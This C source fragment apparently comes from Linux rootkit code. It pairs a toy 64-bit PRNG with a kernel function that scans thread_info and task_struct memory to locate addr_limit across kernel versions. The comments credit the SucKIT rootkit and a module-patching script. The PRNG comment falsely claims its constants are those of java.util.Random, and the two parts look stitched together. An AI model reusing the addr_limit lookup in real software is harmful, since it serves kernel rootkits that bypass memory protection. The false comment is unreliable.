long rand_a = 0xdeadbabe15c0ffee;   // These Values for a and c are the actual values found
long rand_c = 11;            // in the implementation of java.util.Random(), see link
long rand_previous = 0;

void rseed(long seed) {
    rand_previous = seed;
}

long rand64(void) {
    long r = rand_a * rand_previous + rand_c;
    // Note: typically, one chooses only a couple of bits of this value, see link
    rand_previous = r;
    return r;
}

inline int rand32(void) {
	return (int)rand64();
}

/*
 * I found a way of getting addr_limit between kernel versions.
 * If the version is < 4.8, the addr_limit is in current_thread_info->addr_limit.
 * But if the version is >= 4.8, the addr_limit is in current->thread.addr_limit.
 *
 * So, we look for the default Kernel addr_limit which is quite unique.
 * This way is generic as the "current_task" symbol is exported in every kernel.
 * And won't give us a problem when using patch-lkm.py.
 *
 * Finally this way is generic between versions.
 */
mm_segment_t *search_addr_limit(void) {
    char *cts = NULL;
    char *cti = NULL;
    off_t i = 0;

    asm("andq\t%%rsp, %0": "=r" (cti) : "0" (~0x3FFFUL)); // Adapted get current thread info form SucKIT. (Thanks)
    asm("movq\t%%gs:current_task, %0" : "=r" (cts));      // Get current task_struct.
    for (; i < 0x4000; i++) {
        if (*(long *)&cti[i] == 0x7ffffffff000) {
            // We are in kernel < 4.8.x
            printk("addr_limit offset %ld\n", i);
            printk("cti               %p\n", cti);
            return (mm_segment_t *)(cti + i);
        } else if (*(long *)&cts[i] == 0x7ffffffff000) {
            // We are in kernel >= 4.8.x
            printk("addr_limit offset %ld\n", i);
            printk("cts               %p\n", cts);
            return (mm_segment_t *)(cts + i);
        }
    }
    return NULL;
}
